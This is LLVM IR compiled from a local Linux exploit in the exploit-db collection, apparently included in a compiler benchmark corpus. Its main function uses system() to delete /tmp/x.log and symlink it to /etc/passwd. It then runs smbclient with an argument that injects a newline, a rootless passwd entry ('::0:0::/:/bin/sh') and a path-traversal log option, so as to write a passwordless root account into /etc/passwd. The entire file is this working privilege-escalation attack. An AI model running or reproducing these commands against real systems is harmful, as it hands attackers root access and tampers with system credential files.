; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20776.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20776.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.inject1 = private unnamed_addr constant [23 x i8] c"/bin/rm -rf /tmp/x.log\00", align 16
@__const.main.inject2 = private unnamed_addr constant [34 x i8] c"/bin/ln -s /etc/passwd /tmp/x.log\00", align 16
@__const.main.inject3a = private unnamed_addr constant [100 x i8] c"/usr/bin/smbclient //localhost/\22\0A\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@__const.main.inject3b = private unnamed_addr constant [42 x i8] c"::0:0::/:/bin/sh\\n\22 -n ../../../tmp/x -N\0A\00", align 16
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [18 x i8] c"usage: %s <user>\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [23 x i8], align 16
  %7 = alloca [34 x i8], align 16
  %8 = alloca [100 x i8], align 16
  %9 = alloca [42 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = bitcast [23 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %10, i8* align 16 getelementptr inbounds ([23 x i8], [23 x i8]* @__const.main.inject1, i32 0, i32 0), i64 23, i1 false)
  %11 = bitcast [34 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %11, i8* align 16 getelementptr inbounds ([34 x i8], [34 x i8]* @__const.main.inject2, i32 0, i32 0), i64 34, i1 false)
  %12 = bitcast [100 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %12, i8* align 16 getelementptr inbounds ([100 x i8], [100 x i8]* @__const.main.inject3a, i32 0, i32 0), i64 100, i1 false)
  %13 = bitcast [42 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %13, i8* align 16 getelementptr inbounds ([42 x i8], [42 x i8]* @__const.main.inject3b, i32 0, i32 0), i64 42, i1 false)
  %14 = load i32, i32* %4, align 4
  %15 = icmp ne i32 %14, 2
  br i1 %15, label %16, label %21

16:                                               ; preds = %2
  %17 = load i32, i32* @stderr, align 4
  %18 = load i8**, i8*** %5, align 8
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 @fprintf(i32 %17, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0), i8* %19)
  store i32 1, i32* %3, align 4
  br label %36

21:                                               ; preds = %2
  %22 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 @strcat(i8* %22, i8* %25)
  %27 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %28 = getelementptr inbounds [42 x i8], [42 x i8]* %9, i64 0, i64 0
  %29 = call i32 @strcat(i8* %27, i8* %28)
  %30 = getelementptr inbounds [23 x i8], [23 x i8]* %6, i64 0, i64 0
  %31 = call i32 @system(i8* %30, i32 0)
  %32 = getelementptr inbounds [34 x i8], [34 x i8]* %7, i64 0, i64 0
  %33 = call i32 @system(i8* %32, i32 0)
  %34 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %35 = call i32 @system(i8* %34, i32 0)
  store i32 0, i32* %3, align 4
  br label %36

36:                                               ; preds = %21, %16
  %37 = load i32, i32* %3, align 4
  ret i32 %37
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @system(i8*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
